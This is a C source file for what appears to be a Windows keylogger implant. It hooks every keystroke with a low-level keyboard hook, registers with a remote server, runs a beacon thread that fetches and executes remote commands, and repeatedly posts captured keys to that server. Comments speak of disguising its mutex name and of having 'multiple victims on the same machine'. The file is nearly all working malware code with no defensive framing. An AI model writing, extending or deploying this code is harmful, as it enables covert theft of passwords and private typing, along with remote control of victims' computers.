
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "program.h"
#include "../client/commands.h"

/**
 * to make HTTPS traffic you can simply add the  INTERNET_FLAG_SECURE flag
 */

PROGRAM_CONTEXT* progContext;

ERR_CODE setup() {
    // initialise PROGRAM_CONTEXT struct then register with the server
    progContext = initProgramContext();
    if (progContext == NULL) return ECODE_NULL;
    printf("1) Program Init'ed\n");

    // register client 
    int ret = registerClient(progContext->client);
    if (ret != ECODE_SUCCESS) return ret;
    printf("2) Cli Registered\n");

    // give the mutex a somehwat believeable name :) FALSE means we don't have to release from main thread
    HANDLE hMutThrSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
    if (hMutThrSync == NULL) return ECODE_NULL;
    printf("3) Thread Sync Mutex Created\n\n");

    // mutex already exists!
    // THIS CODE IS COMMENTED FOR TESTING ONLY, THIS WAY WE CAN HAVE MULTIPLE VICTIMS ON THE SAME MACHINE!
    // if (GetLastError() == ERROR_ALREADY_EXISTS) {
    //     printf("Client is already infected!");
    //     return 1;
    // }

    progContext->hMutexThreadSync = hMutThrSync;
    return ECODE_SUCCESS;
}

/**
 * initialises a new program context which will how handles to the worker threads 
 * as well as the mutex
 */
PROGRAM_CONTEXT* initProgramContext() {
    PROGRAM_CONTEXT* prCon = (PROGRAM_CONTEXT *)malloc(sizeof(PROGRAM_CONTEXT));
    if (prCon == NULL) return NULL;

    // create client structure
    prCon->client = initClient();
    if (prCon->client == NULL) {
        free(prCon);
        return NULL;
    }

    // create key logger structure
    prCon->kLogger = initKeyLogger();
    if (prCon->kLogger == NULL) {
        free(prCon->client);
        free(prCon);
        return NULL;
    }

    // install the LowLevelKeyboardProc and set the hook
    prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
    if (prCon->hLowLevelKeyHook == NULL) {
        programContextCleanup(prCon);
        return NULL;
    }

    prCon->mainThreadId = GetCurrentThreadId();
    prCon->hCmdThread = NULL;
    prCon->hWriteThread = NULL;
    prCon->hMutexThreadSync = NULL;
    prCon->shutdown = FALSE;
    return prCon;
}


// ----------------------
// --- thread section ---
// ----------------------

ERR_CODE startThreads() {
    // create the worker threads
    HANDLE hCmdThr = CreateThread(NULL, 0, commandsAndBeaconThread, NULL, 0, NULL);
    HANDLE hWriteThr = CreateThread(NULL, 0, writeLogThread, NULL, 0, NULL);

    // update the program context
    progContext->hCmdThread = hCmdThr;
    progContext->hWriteThread = hWriteThr;
    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) return ECODE_NULL;
    
    runKeyLogger();

    // wait for both threads to finish
    HANDLE threads[2] = { 
        progContext->hCmdThread, 
        progContext->hWriteThread,
    };
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);

    printf("Threads complete!\n");
    return ECODE_SUCCESS;
}

/**
 * function that executes infinitely until shd command is given. 
 * Each iteration it retrieves the remote commands and then executes them!
 * 
 * Important note: if the there were no commands recieved, then don't do anything
 * to limit network activity.
 */
DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
    while (!progContext->shutdown) {
        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);

        CLIENT_HANDLER* client = progContext->client;

        // get the commands from the server
        ERR_CODE ret = pollCommandsAndBeacon(client);
        if (ret != ECODE_SUCCESS) printf("ECODE: %s\n", getErrMessage(ret));
        
        // only try and execute the commands if there is something to exec.
        if (strlen(client->cmdBuffer) > 0) {
            ret = executeCommands(client);
            if (ret == ECODE_DO_SHUTDOWN) doShutdown();
            if (ret != ECODE_SUCCESS)     printf("ECODE: %s\n", getErrMessage(ret));
        }

        ReleaseMutex(progContext->hMutexThreadSync);
        Sleep(SLP_CMD_THREAD);
    }
    return 0;
}

void doShutdown() {
    progContext->shutdown = TRUE;  // set the shutdown flag
    // post a message to the main thread, this will cause it to stop!
    PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
}

/**
 * Function that executes infinitely until shd command is given. 
 * Every 10 seconds it attempts to write the captured keys to the server logs
 * 
 * Important note: similar to before, if the key buffer is empty, then don't 
 * do anything to limit network activity.
 */
DWORD WINAPI writeLogThread(LPVOID lpParam) {
    while (!progContext->shutdown) {
        WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);

        KEY_LOGGER* kLogger = progContext->kLogger;

        // skip the write if the buffer is empty
        if (kLogger->bufferPtr == 0)
            goto skipWrite;

        // tries the to write the key buffer, if the post request failed try at max 2 times more
        int ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);
        int i = 1;
        while (ret == ECODE_POST && ++i <= 3)
            ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);

        if (ret == ECODE_SUCCESS) {
            // reset buffer ptr, no need to reset the buffer memory
            kLogger->bufferPtr = 0;
            kLogger->keyBuffer[0] = '\0';
        } else {
            printf("ECODE: %d\n", ret);
        }

        skipWrite:

        ReleaseMutex(progContext->hMutexThreadSync);
        Sleep(SLP_WRITER_THREAD);
    }
    return 0;
}

/**
 * key logger loop that runs on the main thread!
 * This method simply calls the blocking method GetMessageA, this waits for 
 * a message to be posted to this thread. As such, the keylogger terminates 
 * when the shutdown command is sent, which envokes the doShutdown method
 * which posts a message to the main thread!
 * Resources: https://stackoverflow.com/questions/73340668/how-to-process-key-down-state-on-lowlevelkeyboardproc-with-wh-keyboard
 */
ERR_CODE runKeyLogger() {
    MSG msg;
    while (!progContext->shutdown && GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return ECODE_SUCCESS;
}

/**
 * Call back function evoked on every key press, as set by the 
 * SetWindowsHookExA function
 */
LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = keyPress->vkCode;

    // update the keylogger state structure, if it was updated return true
    // this step does not allow shift capslock nor numlock to be put on the buffer.
    // then skip all state update keys and non key down events
    BOOL wasUpdated = updateKeyLoggerState(progContext->kLogger, wParam, &vkCode);
    if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
    
    ERR_CODE ret = addKeyToBuffer(progContext->kLogger, &vkCode);
    if (ret == ECODE_FULL_BUFF) {
        // do something?
    }
    return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
}



// ---------------
// --- Cleanup ---
// ---------------

void programCleanup() {
    programContextCleanup(progContext);
}

/**
 * cleanup function to close each of the handles and free allocated memory
 */
void programContextCleanup(PROGRAM_CONTEXT* prCon) {
    if (prCon == NULL) return;

    // free allocated memory
    if (prCon->client != NULL)   // free the client
        clientCleanup(prCon->client);
    if (prCon->kLogger != NULL)  // free the keylogger
        keyLoggerCleanup(prCon->kLogger);

    // free the 
    if (prCon->hLowLevelKeyHook != NULL)
        UnhookWindowsHookEx(prCon->hLowLevelKeyHook);

    // close thread handles
    if (prCon->hCmdThread != NULL) 
        CloseHandle(prCon->hCmdThread);
    if (prCon->hWriteThread != NULL)
        CloseHandle(prCon->hWriteThread);

    // close mutex handle
    if (prCon->hMutexThreadSync != NULL)
        CloseHandle(prCon->hMutexThreadSync);
    
    // free memory
    free(prCon);
}


